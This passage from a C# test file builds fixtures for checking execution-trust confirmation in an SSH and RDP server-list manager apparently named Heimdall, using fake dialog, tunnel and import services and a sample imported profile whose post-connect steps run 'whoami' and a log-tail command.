    private static ServerProfileDto CreatePostConnectProfile(string id)
    {
        return new ServerProfileDto
        {
            Id = id,
            DisplayName = "Imported SSH",
            RemoteServer = "ssh.example.com",
            ConnectionType = "SSH",
            PostConnectSteps =
            [
                new PostConnectStep { Enabled = true, Input = "whoami" },
                new PostConnectStep { Enabled = true, CommandLibraryId = "tail-log" }
            ]
        };
    }

    private sealed class ServerListExecutionTrustFixture : IAsyncDisposable
    {
        private ServerListExecutionTrustFixture(
            string rootPath,
            ConfigManager configManager,
            ServerListViewModel viewModel,
            TrackingDialogService dialogService,
            ConnectionService connectionService)
        {
            RootPath = rootPath;
            ConfigManager = configManager;
            ViewModel = viewModel;
            DialogService = dialogService;
            ConnectionService = connectionService;
        }

        public string RootPath { get; }

        public ConfigManager ConfigManager { get; }

        public ServerListViewModel ViewModel { get; }

        public TrackingDialogService DialogService { get; }

        public ConnectionService ConnectionService { get; }

        public static async Task<ServerListExecutionTrustFixture> CreateAsync(bool confirmResult)
        {
            string rootPath = Path.Combine(
                Path.GetTempPath(),
                "heimdall-execution-trust",
                Guid.NewGuid().ToString("N"));
            ConfigManager configManager = new ConfigManager(rootPath);
            await configManager.InitializeAsync();

            LocalizationManager localizer = new LocalizationManager();
            await localizer.LoadAsync(Path.Combine(AppContext.BaseDirectory, "locales"), "en");

            ConnectionStateMachine stateMachine = new ConnectionStateMachine();
            ConnectionService connectionService = new ConnectionService(
                configManager,
                localizer,
                new NullTunnelService(),
                Array.Empty<IProtocolHandler>());
            TrackingDialogService dialogService = new TrackingDialogService(confirmResult);
            PuttySessionImporter puttyImporter = new PuttySessionImporter(
                new FakePuttySessionRegistrySource([]),
                configManager);
            KnownHostsImporter knownHostsImporter = new KnownHostsImporter(configManager, new HostKeyStore());
            FakeUiDispatcher uiDispatcher = new FakeUiDispatcher();
            ServerListViewModel viewModel = new ServerListViewModel(
                configManager,
                localizer,
                uiDispatcher,
                stateMachine,
                connectionService,
                dialogService,
                new NullRdpImportService(),
                puttyImporter,
                knownHostsImporter);

            return new ServerListExecutionTrustFixture(rootPath, configManager, viewModel, dialogService, connectionService);
        }

        public ValueTask DisposeAsync()
        {
            ViewModel.Dispose();
            ConnectionService.Dispose();

            try
            {
                if (Directory.Exists(RootPath))
                {
                    Directory.Delete(RootPath, recursive: true);
                }
            }
            catch (DirectoryNotFoundException)
            {
            }

            return ValueTask.CompletedTask;
        }
    }

    private sealed class NullTunnelService : ITunnelService
    {
        public Task<TunnelSetupOutcome> SetupTunnelIfNeededAsync(
            ServerProfileDto server,
            int remotePort,
            AppSettings settings,
            CancellationToken ct,
            bool preferDistinctLoopback = false)
        {
            return Task.FromResult(new TunnelSetupOutcome(true, false, server.RemoteServer, remotePort, (string?)null, null));
        }

        public void UpdateSettings(AppSettings settings)
        {
        }

        public TunnelForwardedPortFailure? GetRecentForwardedPortFailure(int localPort) => null;

        public void ReleaseTunnelReference(int localPort)
        {
        }
    }

    private sealed class NullRdpImportService : IRdpImportService
    {
        public Task<RdpImportPreview> PreviewAsync(string[] filePaths, CancellationToken ct) =>
            Task.FromResult(new RdpImportPreview
            {
                Entries = [],
                FilesNotFound = [],
                FilesUnreadable = []
            });

        public Task<RdpImportResult> ApplyAsync(RdpImportPreview preview, RdpImportSelection selection, CancellationToken ct) =>
            Task.FromResult(new RdpImportResult());
    }

    private sealed class TrackingDialogService(bool confirmResult) : IDialogService
    {
        public string LastConfirmTitle { get; private set; } = string.Empty;

        public string LastConfirmMessage { get; private set; } = string.Empty;

        public string LastSeverity { get; private set; } = string.Empty;

        public int ConfirmCallCount { get; private set; }

        public int LabeledConfirmCallCount { get; private set; }

        public string LastConfirmLabel { get; private set; } = string.Empty;

        public string LastDeclineLabel { get; private set; } = string.Empty;

        public Task<bool> ShowConfirmAsync(string title, string message, string severity = "info")
        {
            LastConfirmTitle = title;
            LastConfirmMessage = message;
            LastSeverity = severity;
            ConfirmCallCount++;
            return Task.FromResult(confirmResult);
        }

        public Task<bool> ShowConfirmAsync(
            string title,
            string message,
            string severity,
            string confirmLabel,
            string declineLabel)
        {
            LabeledConfirmCallCount++;
            LastConfirmLabel = confirmLabel;
            LastDeclineLabel = declineLabel;
            return ShowConfirmAsync(title, message, severity);
        }

        public Task<bool?> ShowSaveDiscardCancelAsync(string title, string message) => Task.FromResult<bool?>(null);

        public Task<string?> ShowInputAsync(string title, string prompt, string? defaultValue = null) => Task.FromResult<string?>(null);

        public Task<string?> ShowPasswordInputAsync(string title, string prompt, CancellationToken cancellationToken = default) => Task.FromResult<string?>(null);

        public Task<ServerDialogResult?> ShowServerDialogAsync(ServerDialogViewModel? editVm = null) => Task.FromResult<ServerDialogResult?>(null);

        public Task<GatewayDialogResult?> ShowGatewayDialogAsync(GatewayDialogViewModel? editVm = null) => Task.FromResult<GatewayDialogResult?>(null);

        public Task<ScheduledTaskDialogResult?> ShowScheduledTaskDialogAsync(ScheduledTaskDialogViewModel? editVm = null) => Task.FromResult<ScheduledTaskDialogResult?>(null);

        public Task ShowPinDialogAsync(PinDialogViewModel viewModel) => Task.CompletedTask;

        public Task<PinSetupResult?> ShowPinSetupDialogAsync(PinSetupDialogViewModel viewModel) => Task.FromResult<PinSetupResult?>(null);

        public Task<SnapshotRestoreDialogResult?> ShowSnapshotRestoreDialogAsync(SnapshotRestoreDialogViewModel viewModel) => Task.FromResult<SnapshotRestoreDialogResult?>(null);

        public Task<RdpImportSelection?> ShowRdpImportDialogAsync(RdpImportDialogViewModel viewModel) => Task.FromResult<RdpImportSelection?>(null);

        public Task<ImportOutcome?> ShowImportOpenSshConfigAsync(OpenSshParseResult parseResult) => Task.FromResult<ImportOutcome?>(null);

        public Task<ImportOutcome?> ShowImportPuttySessionsAsync(PuttySessionParseResult parseResult) => Task.FromResult<ImportOutcome?>(null);

        public Task<KnownHostsImportOutcome?> ShowImportKnownHostsAsync(KnownHostsImportPreview preview) => Task.FromResult<KnownHostsImportOutcome?>(null);

        public Task ShowTrustedHostKeyDetailsAsync(TrustedHostKeyDetailsDialogViewModel viewModel) => Task.CompletedTask;

        public Task<ImportKnownHostsConflictResolution?> ShowImportKnownHostsConflictAsync(
            ImportKnownHostsConflictDialogViewModel viewModel)
            => Task.FromResult<ImportKnownHostsConflictResolution?>(null);

        public Task<CommandLibraryPickerResult?> ShowCommandLibraryPickerAsync(
            CommandLibraryPickerDialogViewModel viewModel,
            AutoPrefillContext? prefillContext = null,
            string? existingActionId = null,
            IReadOnlyDictionary<string, string>? existingValues = null)
            => Task.FromResult<CommandLibraryPickerResult?>(null);

        public Task<int?> ShowBulkEditPortAsync(int count, int? initialPort, CancellationToken cancellationToken) => Task.FromResult<int?>(null);

        public Task<string?> ShowBulkEditUsernameAsync(int count, string? initialUsername, CancellationToken cancellationToken) => Task.FromResult<string?>(null);

        public Task<string?> ShowBulkEditPasswordAsync(int count, CancellationToken cancellationToken) => Task.FromResult<string?>(null);

        public void ShowError(string title, string message)
        {
        }

        public void ShowInfo(string title, string message)
        {
        }

        public void ShowWarning(string title, string message)
        {
        }
    }
}
